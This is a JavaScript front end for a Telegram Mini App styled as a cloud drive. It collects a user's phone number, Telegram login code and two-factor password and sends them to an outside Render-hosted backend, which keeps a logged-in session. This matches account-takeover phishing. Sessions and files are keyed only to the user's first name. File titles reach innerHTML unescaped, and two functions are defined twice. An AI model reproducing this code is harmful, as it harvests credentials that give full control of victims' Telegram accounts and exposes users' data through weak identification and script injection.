
const tg = window.Telegram.WebApp;
tg.expand();
tg.ready(); // App ကို Ready ဖြစ်ကြောင်း ကြေညာမည်

// 🔴 သင့် Render URL အမှန်ဖြင့် အစားထိုးပါ
const BACKEND_URL = "https://telegramcloudbackend.onrender.com"; 

let phoneHash = "", userPhone = "", pollingInterval;
let userName = tg.initDataUnsafe?.user?.first_name || "Unknown Account";

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    let target = document.getElementById(stepId);
    if(target) target.classList.remove("hidden");
}

function setLoadingText(text) {
    document.getElementById("loading-text").innerText = text;
}

// 💡 1. AUTO LOGIN CHECK (App ဖွင့်သည်နှင့် အလုပ်လုပ်မည်)
window.onload = async () => {
    switchStep("step-loading");
    setLoadingText("Checking secure connection...");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_session`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        
        if(result.exists) {
            // အကောင့်ရှိပြီးသားဆိုလျှင် Cloud ထဲ တန်းဝင်မည်
            switchStep("step-success");
            fetchCloudData();
        } else {
            // အကောင့်မရှိသေးလျှင် Login စာမျက်နှာပြမည် (Device စစ်ပြီးပြမည်)
            let platform = tg.platform;
            if (platform === "tdesktop" || platform === "macos" || platform === "web" || platform === "weba") {
                document.getElementById("btn-share").classList.add("hidden");
                document.getElementById("desktop-input-area").classList.remove("hidden");
            }
            switchStep("step-phone");
        }
    } catch(e) {
        // Error တက်လျှင် Login ပြန်ပြမည်
        switchStep("step-phone");
    }
};

// 💡 2. MOBILE LOGIN (Share Contact)
function handleMobileContact() {
    if (!tg.requestContact) return; 
    tg.requestContact(function(shared) {
        if (shared) {
            let userId = tg.initDataUnsafe?.user?.id;
            if (!userId) return alert("Error: User ID ဖတ်မရပါ။");
            
            setLoadingText("Requesting OTP...");
            switchStep("step-loading");
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    alert("Timeout: ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။");
                    switchStep("step-phone");
                }
            }, 15000);
        }
    });
}

// 💡 3. DESKTOP LOGIN (Manual Phone)
async function handleDesktopContact() {
    let phone = document.getElementById("manual_phone").value.trim();
    if (!phone) return alert("ဖုန်းနံပါတ် ရိုက်ထည့်ပါ။");
    if (!phone.startsWith("+")) phone = "+" + phone;

    userPhone = phone;
    setLoadingText("Sending code...");
    switchStep("step-loading");

    try {
        let res = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ phone: userPhone })
        });
        let result = await res.json();
        
        if (result.success) {
            phoneHash = result.hash;
            switchStep("step-otp");
        } else {
            alert("Error: " + result.message);
            switchStep("step-phone");
        }
    } catch (e) {
        alert("Connection Failed.");
        switchStep("step-phone");
    }
}

// 💡 4. CHECK CONTACT POLLING
async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ user_id: userId })
        });
        let result = await res.json();
        
        if (result.success) {
            clearInterval(pollingInterval); pollingInterval = null;
            userPhone = result.phone; phoneHash = result.hash;
            switchStep("step-otp"); 
            tg.HapticFeedback.impactOccurred("medium");
        } else if (result.message) { 
            clearInterval(pollingInterval); pollingInterval = null;
            alert("Error: " + result.message);
            switchStep("step-phone");
        }
    } catch(e) {}
}

// 💡 5. VERIFY OTP
async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return alert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။");
    
    setLoadingText("Verifying...");
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName })
        });
        let result = await res.json();
        
        if(result.success) {
            switchStep("step-success");
            tg.HapticFeedback.notificationOccurred("success"); 
            fetchCloudData(); // Auto fetch after login
        } else if (result.message === "2FA_REQUIRED") {
            switchStep("step-2fa");
        } else {
            alert("Error: " + result.message);
            switchStep("step-otp");
        }
    } catch(e) {
        alert("Verification Failed.");
        switchStep("step-otp");
    }
}

// 💡 6. VERIFY 2FA
async function verify2FA() {
    let password = document.getElementById("password_input").value;
    if(!password) return alert("Password ရိုက်ထည့်ပါ။");
    
    setLoadingText("Unlocking...");
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ phone: userPhone, code: document.getElementById("otp_input").value, hash: phoneHash, name: userName, password: password })
        });
        let result = await res.json();
        
        if(result.success) {
            switchStep("step-success");
            tg.HapticFeedback.notificationOccurred("success"); 
            fetchCloudData();
        } else {
            alert("Error: Password မှားယွင်းနေပါသည်။");
            switchStep("step-2fa");
        }
    } catch(e) {
        alert("Verification Failed.");
        switchStep("step-2fa");
    }
}

// 💡 7. FETCH & RENDER CLOUD DATA
async function fetchCloudData() {
    let statusText = document.getElementById("cloud-status");
    let filesList = document.getElementById("cloud-files-list");
    
    statusText.innerText = "Syncing securely...";
    statusText.style.color = "var(--text-muted)";
    filesList.innerHTML = "<div class='flex-center' style='height:100px;'><div class='modern-spinner'></div></div>";
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_cloud_data`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        
        if(result.success) {
            statusText.innerText = `Storage Synced: ${result.files.length} items`;
            statusText.style.color = "#4CAF50";
            renderFiles(result.files);
        } else {
            statusText.innerText = "Sync failed.";
            filesList.innerHTML = "";
        }
    } catch(e) {
        statusText.innerText = "Connection error.";
        filesList.innerHTML = "";
    }
}

function renderFiles(files) {
    let html = "";
    if(files.length === 0) {
        html = "<div class='flex-center' style='height:150px; color:var(--text-muted);'><i class='fa-solid fa-box-open mb-2' style='font-size:30px;'></i><p>Your cloud is empty.</p></div>";
    } else {
        files.forEach(f => {
            let iconClass = f.type === "doc" ? "fa-file-lines doc" : (f.type === "photo" ? "fa-image" : "fa-note-sticky");
            html += `
            <div class="file-item">
                <div class="f-icon ${f.type}"><i class="fa-solid ${iconClass}"></i></div>
                <div class="f-details">
                    <div class="f-title">${f.title}</div>
                    <div class="f-date">${f.date}</div>
                </div>
            </div>`;
        });
    }
    document.getElementById("cloud-files-list").innerHTML = html;
}

// 💡 8. SAVE NOTE TO CLOUD
async function saveCloudNote() {
    let noteInput = document.getElementById("note_input");
    let text = noteInput.value.trim();
    if(!text) return;
    
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i>";
    btn.disabled = true;
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/upload_note`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName, text: text })
        });
        let result = await res.json();
        
        if(result.success) {
            noteInput.value = "";
            tg.HapticFeedback.notificationOccurred("success");
            fetchCloudData(); 
        }
    } catch(e) {}
    
    btn.innerHTML = "<i class='fa-solid fa-arrow-up'></i>";
    btn.disabled = false;
}

let allFilesData = [];

async function fetchCloudData() {
    let statusText = document.getElementById("cloud-status");
    let grid = document.getElementById("cloud-files-grid");
    
    statusText.innerText = "Syncing with Telegram Cloud...";
    grid.innerHTML = "<div class='flex-center' style='grid-column: 1 / -1;'><div class='modern-spinner'></div></div>";
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_cloud_data`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        
        if(result.success) {
            allFilesData = result.files;
            statusText.innerText = `${allFilesData.length} items synced.`;
            renderFilesGrid(allFilesData);
        } else {
            statusText.innerText = "Sync failed.";
        }
    } catch(e) {
        statusText.innerText = "Connection error.";
    }
}

// 📁 Grid View ဖြင့် ပြသခြင်း
function renderFilesGrid(files) {
    let html = "";
    if(files.length === 0) {
        html = "<div class='flex-center' style='grid-column: 1 / -1; color: var(--text-muted);'><i class='fa-brands fa-google-drive mb-2' style='font-size:40px;'></i><p>Your drive is empty.</p></div>";
    } else {
        files.forEach(f => {
            let icon = f.type === "doc" ? "fa-file-lines doc" : (f.type === "photo" ? "fa-image photo" : "fa-note-sticky text");
            // ဖိုင်ကို နှိပ်လိုက်ပါက openFile() ကို ခေါ်မည်
            html += `
            <div class="file-card" onclick="openFile(${f.id})">
                <i class="fa-solid ${icon} fc-icon"></i>
                <div class="fc-title">${f.title}</div>
                <div class="fc-meta">${f.size || f.date}</div>
            </div>`;
        });
    }
    document.getElementById("cloud-files-grid").innerHTML = html;
}

// 🔍 Search နှင့် Filter လုပ်ခြင်း
function filterFiles(type, element) {
    // Menu အပြောင်းအလဲ UI
    document.querySelectorAll('.nav-links li, .nav-item').forEach(el => el.classList.remove('active'));
    if(element) element.classList.add('active');
    
    let titles = { 'all': 'My Drive', 'photo': 'Photos', 'doc': 'Documents', 'text': 'Notes' };
    document.getElementById('current-category').innerText = titles[type];
    
    let filtered = type === 'all' ? allFilesData : allFilesData.filter(f => f.type === type);
    renderFilesGrid(filtered);
}

function searchFiles(query) {
    let lowerQ = query.toLowerCase();
    let filtered = allFilesData.filter(f => f.title.toLowerCase().includes(lowerQ));
    renderFilesGrid(filtered);
}

// 🚀 Telegram Native Viewer ဖြင့် ဖိုင်ဖွင့်ခြင်း (UX Magic)
async function openFile(msgId) {
    tg.HapticFeedback.impactOccurred("light");
    
    // ဖိုင်ကို Bot Chat ထဲသို့ ပို့ရန် API လှမ်းခေါ်မည်
    fetch(`${BACKEND_URL}/api/view_file`, {
        method: "POST", headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ name: userName, msg_id: msgId })
    });
    
    // API ခေါ်ပြီးသည်နှင့် Mini App ကို ချက်ချင်း ပိတ်ချလိုက်မည်
    // ၎င်းအခါ အသုံးပြုသူသည် ၎င်းတို့၏ Telegram Chat သို့ ရောက်သွားပြီး ဖိုင်ကို Native အတိုင်း တန်းမြင်ရမည်
    tg.close(); 
}

// 💾 Note အသစ်သိမ်းခြင်း
async function saveCloudNote() {
    let noteInput = document.getElementById("note_input");
    let text = noteInput.value.trim();
    if(!text) return;
    
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i>";
    btn.disabled = true;
    
    try {
        await fetch(`${BACKEND_URL}/api/upload_note`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName, text: text })
        });
        noteInput.value = "";
        tg.HapticFeedback.notificationOccurred("success");
        fetchCloudData(); 
    } catch(e) {}
    
    btn.innerHTML = "<i class='fa-solid fa-paper-plane'></i>";
    btn.disabled = false;
}
